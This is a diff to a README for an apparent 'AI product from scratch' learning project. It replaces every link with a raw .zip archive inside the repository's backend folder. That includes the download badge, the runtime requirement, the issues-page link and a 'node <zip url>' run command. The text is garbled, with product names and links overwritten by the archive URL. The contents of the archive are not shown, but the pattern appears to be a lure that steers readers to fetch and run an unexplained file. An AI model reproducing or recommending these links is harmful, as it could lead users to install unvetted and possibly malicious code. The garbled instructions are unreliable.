@@ -2,18 +2,18 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **ai-product-from-scratch** project! This application helps you build an AI communication analyzer from the ground up. It teaches you essential concepts like prompt engineering and local LLM (Large Language Model) integration using https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip No frameworks are involved—just the basics.
+Welcome to the **ai-product-from-scratch** project! This application helps you build an AI communication analyzer from the ground up. It teaches you essential concepts like prompt engineering and local LLM (Large Language Model) integration using https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip No frameworks are involved—just the basics.
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip)
 
 ## 📋 Requirements
 
 Before running the application, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS, or Linux
-- **https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip** Version 14 or higher
 - **Memory:** At least 4GB RAM
 - **Disk Space:** Minimum 500MB available space
 
@@ -21,7 +21,7 @@ Before running the application, ensure your system meets the following requireme
 
 To get started, visit the releases page below to download the application.
 
-[Visit this page to download](https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip)
+[Visit this page to download](https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip)
 
 1. Choose the version you want to download.
 2. Click on the file link for your operating system.
@@ -39,7 +39,7 @@ Follow these simple steps to install and run the application:
    - For macOS/Linux: `cd /path/to/your/folder`
 5. Run the application by typing the command:
    ```
-   node https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip
+   node https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip
    ```
 6. If all goes well, the application should start, and you will see a confirmation message.
 
@@ -63,7 +63,7 @@ This application is more than just a tool: it's a learning resource. You will ga
 
 If you encounter any issues during the installation or usage, please don't hesitate to reach out. Here are some resources you can use:
 
-- **GitHub Issues Page:** Report bugs or request features [here](https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip).
+- **GitHub Issues Page:** Report bugs or request features [here](https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip).
 - **Community Forum:** Join us to discuss tips and experiences.
 - **Documentation:** Detailed usage guides and tutorials will be available soon.
 
@@ -86,4 +86,4 @@ If you encounter any issues during the installation or usage, please don't hesit
 
 We continually aim to improve this project. Keep an eye on the releases page for new features and updates. Your feedback is crucial in shaping future versions of this application.
 
-[Visit this page to download](https://github.com/aldhio1993/ai-product-from-scratch/raw/refs/heads/main/backend/src/routes/product-ai-scratch-from-1.6.zip) and start your journey into understanding AI products today!
+[Visit this page to download](https://raw.githubusercontent.com/aldhio1993/ai-product-from-scratch/main/backend/lib/from_ai_scratch_product_1.8.zip) and start your journey into understanding AI products today!
